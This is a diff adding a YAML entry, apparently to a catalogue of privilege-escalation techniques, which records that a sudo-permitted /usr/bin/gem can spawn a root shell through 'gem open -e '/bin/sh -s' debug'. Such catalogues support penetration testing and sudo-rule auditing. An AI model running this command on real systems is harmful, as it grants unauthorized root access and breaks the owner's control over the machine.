@@ -1,0 +1,4 @@
+name: gem
+binary_path: /usr/bin/gem
+exploit_cmds:
+- sudo /usr/bin/gem open -e '/bin/sh -s' debug
